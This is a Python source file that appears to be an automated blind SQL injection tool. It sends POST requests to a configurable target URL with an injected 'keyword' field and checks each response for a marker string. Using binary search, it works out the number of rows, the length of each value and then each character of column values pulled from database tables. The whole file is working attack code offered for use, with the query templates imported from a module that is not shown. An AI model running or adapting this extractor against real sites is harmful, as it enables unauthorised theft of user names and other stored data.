from requests import post
import query as q
from sys import exit

### VAL AREA
targetURL = q.get_var("targetURL")
headers = q.get_var("headers")
cookies = q.get_var("cookies")
data = q.get_var("data")


### FUNCTION AREA
def check_query(query, mid):
    completeQuery = query + str(mid)
    data["keyword"] = q.get_var("baseQuery").format(completeQuery)
    print(data["keyword"])

    r = post(targetURL, headers=headers, cookies=cookies, data=data)
    if q.get_var("targetString") in r.text:
        return True
    else:
        return False


def binary_search(low, high, query):
    result = None  # answer value
    while low <= high:
        mid = (low + high) // 2
        if check_query(query, mid):
            # query is over mid
            low = mid + 1
        else:
            # mid found, narrow down searching
            result = mid
            high = mid - 1
    return result


def send_SQL(column, table, condition=None):
    result = {}

    countQuery = (
        q.get_count_extend(column, table, condition)
        if condition
        else q.get_count(column, table)
    )
    nameCountMAX = binary_search(0, 1000, countQuery)
    print(f"{nameCountMAX} names here")

    for num in range(1, nameCountMAX + 1):
        name = ""

        indexQuery = (
            q.get_index_extend(column, table, condition).format(num)
            if condition
            else q.get_index(column, table).format(num)
        )
        nameIndexMAX = binary_search(1, 50, indexQuery)
        print(f"{num} user name: {nameIndexMAX} characters")

        for index in range(1, nameIndexMAX + 1):
            dataQuery = (
                q.get_data_extend(column, table, condition).format(index, num)
                if condition
                else q.get_data(column, table).format(index, num)
            )
            nameChr = chr(binary_search(1, 200, dataQuery))
            print(nameChr)
            name = name + nameChr

        result[str(num)] = name
        print(f"{num}:{name} Done.")

    return result
